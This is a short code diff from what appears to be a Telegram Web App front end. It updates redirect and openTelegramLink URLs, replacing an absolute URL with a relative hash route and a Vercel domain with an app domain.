@@ -115,8 +115,8 @@ else{
                 const goToPage = (path: string) => {
                     window.location.href = path;  
                   };
-                    goToPage('https://app.nekstpei.com/#/home'); 
-                    window.Telegram.WebApp.openTelegramLink('https://nexr-pi.vercel.app/#/home');                
+                    goToPage('#/home'); 
+                    window.Telegram.WebApp.openTelegramLink('https://app.nekstpe.com/#/home');                
 
             } else {
                 const infoPan = document.getElementById('infoPan') ;
